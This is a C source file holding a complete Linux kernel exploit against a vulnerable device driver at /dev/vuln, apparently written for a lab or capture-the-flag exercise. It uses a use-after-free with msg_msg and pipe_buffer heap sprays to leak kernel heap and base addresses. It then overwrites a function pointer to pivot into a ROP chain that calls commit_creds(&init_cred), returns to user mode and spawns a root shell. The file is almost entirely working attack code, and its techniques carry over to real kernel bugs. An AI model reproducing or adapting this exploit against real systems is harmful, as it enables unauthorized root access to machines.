#define _GNU_SOURCE

#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <unistd.h>

#define K1_TYPE 0xB9

#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)
#define CHUNK_SIZE 1024
#define NUM_QUEUE 16
#define MSG_MSG_SIZE 0x30
struct msgmsg_struct {
    void * ptr1;
    void * ptr2;
    long mtype;
    size_t m_ts;
    struct msg_msgseg *next;
    void * security;
};
struct {
    long mtype;
    char mtext[CHUNK_SIZE - MSG_MSG_SIZE];
} msgbuf = {
    .mtype = 1
};  
int size = CHUNK_SIZE;
int ret; // to store return number and detect error
int sin_msqid;
uint64_t* memdump;
uint64_t* rop_chain;
int pipefd[NUM_QUEUE][2];
uint64_t user_cs;
uint64_t user_ss;
uint64_t user_sp;
uint64_t user_rflags;
uint64_t cs;
void shell(void) {
    printf("hi 1\n");
    system("/bin/sh");
    printf("hi 2\n");
}
int spray_msgmsg(void) {
    sin_msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (sin_msqid < 0) {
        printf("Error creating msqid: %s\n", strerrorname_np(errno));
        return -1;
    }
    for (int i = 0; i < NUM_QUEUE; ++i) {
        msgbuf.mtype = i + 1;
        ret = msgsnd(sin_msqid, &msgbuf, CHUNK_SIZE - MSG_MSG_SIZE, IPC_NOWAIT);
        if (ret < 0) {
            printf("Error sending msg: %s\n", strerrorname_np(errno));
            return -1;
        }
    }
}

void save_state(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int free_msgmsg(int type) {
    ret = msgrcv(sin_msqid, memdump, CHUNK_SIZE - MSG_MSG_SIZE, type, IPC_NOWAIT);
    if (ret < 0) {
        printf("Error freeing msg: %s\n", strerrorname_np(errno));
        return -1;
    }
}


int free_allmsgmsg(void) {
    for (int i = 0; i < NUM_QUEUE; ++i) {
        ret = msgrcv(sin_msqid, memdump, CHUNK_SIZE - MSG_MSG_SIZE, 0, IPC_NOWAIT);
    }
}

int spray_pipe(void) {
    for (int i = 0; i < NUM_QUEUE; ++i) {
        ret = pipe(pipefd[i]); // pipe_buffer kernel objects in the heap
        if (ret < 0) {
            printf("Error creating pipes: %s\n", strerrorname_np(errno));
            return -1;
        }
        ret = write(pipefd[i][1], "XDXD", 4);
        if (ret < 0) {
            printf("Error writing to pipes: %s\n", strerrorname_np(errno));
            return -1;
        }
    }
}

int closepipe(void) {
    for (int i = 0; i < NUM_QUEUE; ++i) {
        close(pipefd[i][1]);
        close(pipefd[i][0]);
    }
}
int main() {
    save_state();
    printf("start\n \n \n \n");
    int fd = open("/dev/vuln", O_RDWR);
    memdump = malloc(CHUNK_SIZE);
    rop_chain = malloc(CHUNK_SIZE);
    memset(msgbuf.mtext, 'A', CHUNK_SIZE - MSG_MSG_SIZE);
    // just allocate a chunk
    ioctl(fd, ALLOC, &size);
    // just free the chunk
    ioctl(fd, FREE);
    if (spray_msgmsg() < 0) {
        printf("failed spraing msgmsg\n");
        return 0;
    }
    //getchar();
    ioctl(fd, USE_READ, memdump);
    printf("Memdump @ %p\n", memdump);
    uint64_t heap_leak = *(memdump);
    printf("kheap leak @ %p\n", heap_leak);
    long type = *(memdump + 2);
    
    if (free_msgmsg(type) < 0) { // there is a hole again after freeing msgmsg!
        printf("failed");
        return 0;
    }
    if (spray_pipe() < 0) {
        printf("failed spraying pipe\n");
        return 0;
    }
    //getchar();
    ioctl(fd, USE_READ, memdump);
    uint64_t kbase = *(memdump + 2) - 0x121ec40;
    
    printf("kernel base @ %p\n", kbase);

    uint64_t pop_rdi = kbase + 0xeaf204;
    uint64_t push_rsi_pop_rsp_jmp_rsi0xf = kbase + 0xd51f76;
    uint64_t test_gadget = kbase + 0xd4ad2a;
    uint64_t pop_rsp_ret = kbase + 0xeadf45;
    uint64_t add_rsp_0x50_pop_3_times_ret = kbase + 0xeade31;
    uint64_t init_cred = kbase + 0x1a52fc0;
    uint64_t commit_creds = kbase + 0x0b9970;
    uint64_t swapgs_ret = kbase + 0x100180c;
    uint64_t iretq = kbase + 0x1001ce6;
    printf("pop rdi @ %p\n", pop_rdi);
    printf("push_rsi_pop_rsp_jmp_rsi0xf @ %p\n", push_rsi_pop_rsp_jmp_rsi0xf);
    printf("test_gadget @ %p\n", test_gadget);
    *(rop_chain + 0) = test_gadget;
    memcpy(msgbuf.mtext, rop_chain, 0x8);
    free_allmsgmsg();
    if (spray_msgmsg() < 0) {
        printf("failed spraing msgmsg\n");
        return 0;
    }
    if (spray_msgmsg() < 0) {
        printf("failed spraing msgmsg\n");
        return 0;
    }
    *(memdump + 0) = add_rsp_0x50_pop_3_times_ret;
    *(memdump + 1) = 0; // 0x8 0xf 0x10
    *(memdump + 2) = heap_leak + 0x28;
    *(uint64_t*)((char*)memdump + 0x44) = pop_rsp_ret;
    *(memdump + 0x50/8) = 0xdeadbeefbeefdead;
    *(memdump + 0x50/8 + 1) = 0xdeadbeefbeefdead;
    *(memdump + 0x50/8 + 2) = 0xdeadbeefbeefdead;
    *(memdump + 0x50/8 + 3) = 0xdeadbeefbeefdead;
    *(memdump + 0x50/8 + 4) = pop_rdi;
    *(memdump + 0x50/8 + 5) = init_cred;
    *(memdump + 0x50/8 + 6) = commit_creds;
    *(memdump + 0x50/8 + 7) = swapgs_ret;
    *(memdump + 0x50/8 + 8) = iretq;
    *(memdump + 0x50/8 + 9) = (uint64_t)shell;
    *(memdump + 0x50/8 + 10) = user_cs;
    *(memdump + 0x50/8 + 11) = user_rflags;
    *(memdump + 0x50/8 + 12) = user_sp + 8;
    *(memdump + 0x50/8 + 13) = user_ss;
    // call commit_creds(&init_cred);
    getchar();
    ioctl(fd, USE_WRITE, memdump);
    closepipe();
    free(memdump);
    return 0;
}